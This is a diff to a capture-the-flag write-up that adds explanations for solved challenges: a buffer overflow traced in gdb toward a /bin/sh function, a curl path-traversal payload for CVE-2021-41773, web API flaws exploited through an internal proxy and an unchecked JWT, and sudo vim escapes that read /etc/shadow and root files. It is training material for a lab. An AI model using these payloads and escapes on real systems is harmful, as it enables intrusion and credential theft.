@@ -261,6 +261,78 @@ This script returns the flag: `SIG{1337_h4xx0r}`
 
 ## PWN
 
+### Tiny Buffer
+
+We have to find a buffer overflow in the binary. We can do so by just entering a random amount of characters when executing the binary until we crash: 
+```
+$ ./pwn1
+I sure hope noone calls shell()...
+Give me some input
+> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Alright you gave me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@
+fish: Job 1, './pwn1' terminated by signal SIGSEGV (Address boundary error)
+```
+
+Nice! We can now try to the the minimum number of characters by repeating the same process. You'll notice that we can pass 32 characters without breaking the program. So what happens if we pass 40 or 48 characters? Let's find out.
+
+```
+$ python3 -c 'print("A" * 32 + "B" * 8 + "C" * 8)'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
+$ gdb ./pwn1
+(skipped)
+(gdb) r
+Starting program: /mnt/data/technical/ctf/sigflag-ctf/pwn/pwn1 
+I sure hope noone calls shell()...
+Give me some input
+> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
+Alright you gave me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC�@
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000400b82 in getinput ()
+```
+
+We can print all the registers with the `info registers` (short: `i r`) command:
+```
+(gdb) info registers
+rax            0x48                72
+rbx            0x4002e0            4195040
+rcx            0x4339c0            4405696
+rdx            0x6b4720            7030560
+rsi            0x7fffffff4750      140737488308048
+rdi            0x0                 0
+rbp            0x4242424242424242  0x4242424242424242
+rsp            0x7fffffff6de8      0x7fffffff6de8
+r8             0x6b6880            7039104
+r9             0x48                72
+r10            0xffffffffffffffff  -1
+r11            0x246               582
+r12            0x401770            4200304
+r13            0x401800            4200448
+r14            0x0                 0
+r15            0x0                 0
+rip            0x400b82            0x400b82 <getinput+92>
+eflags         0x10206             [ PF IF RF ]
+cs             0x33                51
+ss             0x2b                43
+```
+
+TODO
+
+
+
+```
+.text:0000000000400B83 shell           proc near
+.text:0000000000400B83 ; __unwind {
+.text:0000000000400B83                 push    rbp
+.text:0000000000400B84                 mov     rbp, rsp
+.text:0000000000400B87                 lea     rdi, aBinSh     ; "/bin/sh"
+.text:0000000000400B8E                 call    system
+.text:0000000000400B93                 nop
+.text:0000000000400B94                 pop     rbp
+.text:0000000000400B95                 retn
+.text:0000000000400B95 ; } // starts at 400B83
+```
+
 ## Crypto
 
 ### Homemade Crypto
@@ -314,7 +386,7 @@ Decryptio
 
 ### Apache Semester 1
 
-we have to find all hidden exam questions. the first one is linked in the HTML and not hard to find:
+we have to find all hidden exam questions. the first one is linked in the HTML and not hard to find: `http://game.sigflag.at:3071/questions.txt`
 
 ```
 <h1>1 Semester Exam Questions</h1>
@@ -322,22 +394,14 @@ we have to find all hidden exam questions. the first one is linked in the HTML a
 <a href="questions.txt">questions.txt</a>
 ```
 
-```
-http://game.sigflag.at:3071/questions.txt
-```
-
 ### Apache Semester 2
 
-the second set of questions can be accessed by clicking on the link in the DevTools, bypassing the script.
+the second set of questions can be accessed by clicking on the link in the DevTools (`http://game.sigflag.at:3072/harder-questions.txt`), bypassing the script.
 
 ```
 <h1>2 Semester Exam Questions</h1>
 
 <a href="harder-questions.txt" onclick="alert('You are not supposed to access this!'); return false;">Questions</a>
-```
-
-```
-http://game.sigflag.at:3072/harder-questions.txt
 ```
 
 
@@ -357,6 +421,8 @@ File last edited: 21.09.2005
 
 
 ### Apache Semester 4
+
+both `.htaccess` and `.htpasswd` were exposed:
 
 `https://game.sigflag.at:3084/exam/.htaccess`:
 
@@ -390,9 +456,7 @@ This is the hint we have:
 Alias /admin /
 ```
 
-```
-http://game.sigflag.at:3075/admin/opt/well_hidden_questions.txt
-```
+we can browse the file system by going to `http://game.sigflag.at:3075/admin` and eventually find the questions here: `http://game.sigflag.at:3075/admin/opt/well_hidden_questions.txt`
 
 ### Apache Semester 6
 
@@ -417,13 +481,15 @@ The questions could be found at `http://game.sigflag.at:3076/exam/questions.txt`
 
 ### Apache Semester 7
 
-the hint given was `CVE-2021-41773`
+the hint given was `CVE-2021-41773` - a search online revealed ways exploit it
 
 ```bash
 curl "https://game.sigflag.at:3087/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/home/bpfh/flag.txt" --insecure --path-as-is  
 ```
 
 ### A1
+
+get the info of user `flag1`: `http://game.sigflag.at:3002/userinfo/flag1`
 
 ```python
 users = DefaultDict(
@@ -455,9 +521,6 @@ async def userinfo(username: int | str, request: Request, authorize: AuthJWT = D
     return {"name": username, "pass": password}
 ```
 
-```
-http://game.sigflag.at:3002/userinfo/flag1
-```
 
 ### A2
 
@@ -492,6 +555,8 @@ async def login(username=Form(), password=Form(), authorize: AuthJWT = Depends()
 
 ### A4
 
+since every call of the `/proxy` endpoint takes at least 1 second, we can chain 5 together to get to the 5 second threshold: `http://game.sigflag.at:3002/proxy/proxy/proxy/proxy/proxy/proxy`
+
 ```python
 @app.middleware("http")
 async def timeout_middleware(request: Request, call_next):
@@ -512,11 +577,9 @@ def localproxy(path: str):
     return PlainTextResponse(requests.get("http://localhost/" + path).text)
 ```
 
-```
-http://game.sigflag.at:3002/proxy/proxy/proxy/proxy/proxy/proxy
-```
-
 ### A5
+
+since we only need some JWT cookie (the content is never checked), we can log in as any user and get the admin password: `http://game.sigflag.at:3002/userinfo/admin`
 
 ```python
 users = DefaultDict(
@@ -548,15 +611,14 @@ async def userinfo(username: int | str, request: Request, authorize: AuthJWT = D
     return {"name": username, "pass": password}
 ```
 
-```
-http://game.sigflag.at:3002/userinfo/admin
-```
-
 ### A6
 
 ### A7
 
 ### A8
+
+because the userinfo endpoint takes integers, we can use the username `0` to get flag 8 since the integer `0` is falsy: `http://game.sigflag.at:3002/userinfo/0`
+    
 
 ```python
 @data.get("/userinfo/{username}")
@@ -577,11 +639,11 @@ async def userinfo(username: int | str, request: Request, authorize: AuthJWT = D
     return {"name": username, "pass": password}
 ```
 
-```
-http://game.sigflag.at:3002/userinfo/0
-```
-
 ### A9
+
+flag 9 is only shown if an exception is triggered and the request comes from localhost
+
+if we call the `/crypto` endpoint with no parameters, we can trigger the exception - and the request comes from localhost if we send it through the `/proxy` endpoint: `http://game.sigflag.at:3002/proxy/crypto`
 
 ```python
 @data.get("/crypto")
@@ -622,11 +684,11 @@ def general_exception_handler(req: Request, exc: Exception):
         return PlainTextResponse(str(exc), 500)
 ```
 
-```
-http://game.sigflag.at:3002/proxy/crypto
-```
-
 ### A10
+
+we can only access the user info of the `local` user if the request comes from localhost
+
+the `/proxy` endpoint allows us to send requests to localhost: `http://game.sigflag.at:3002/proxy/userinfo/local`
 
 ```python
 users = DefaultDict(
@@ -666,39 +728,52 @@ async def userinfo(username: int | str, request: Request, authorize: AuthJWT = D
     return {"name": username, "pass": password}
 ```
 
-```
-http://game.sigflag.at:3002/proxy/userinfo/local
-```
-
 ## Misc
 
 ### Sudo Vim 1
 
-```
+because we can execute vim via sudo, we can use it to execute commands as root via `:!`
+
+the first flag is in root's home
+
+```bash
+# in vim
 :!cat /root/flag
 ```
 
 ### Sudo Vim 2
 
+the second flag is in the environment
+
+this command can be executed without root privileges
+
 ```bash
-printenv # not in vim
+printenv
 ```
 
 ### Sudo Vim 3
 
-```
-:!cat /etc/passwd
+the next flag is in the passwd file, accessible to everyone
+
+```bash
+cat /etc/passwd
 ```
 
 ### Sudo Vim 4
 
-```
+the next flag is in the shadow file, only accessible to root
+
+```bash
+# in vim
 :!cat /etc/shadow
 ```
 
 ### Sudo Vim 5
 
-```
+the next flag is also in the shadow file, but base64 encoded
+
+```bash
+# in vim
 :!cat /etc/shadow
 ```
 
@@ -706,13 +781,19 @@ decode `U0lHe00wNS1TbGlnaHRseUIzdHRlckhpZGRlblBhc3N3b3JkfQ==` (base64)
 
 ### Sudo Vim 6
 
-```
+the 6th flag is in the root home directory, hidden from `ls` since it's prefixed with `.`
+
+```bash
+#in vim
 :!cat /root/.flag
 ```
 
 ### Sudo Vim 7
 
-```
+the next flag is also there, but base85 encoded
+
+```bash
+# in vim
 :!cat /root/.encryptedflag85
 ```
 
@@ -720,8 +801,10 @@ decode ``;b9K+9e\LX6=FqH2De!H=(-ARDf8'QF*U5nE\`?^dF+"`` (base85)
 
 ### Sudo Vim 8
 
+the last flag is revealed by executing `man`:
+
 ```bash
-man # not in vim
+man
 ```
 
 ## Stego
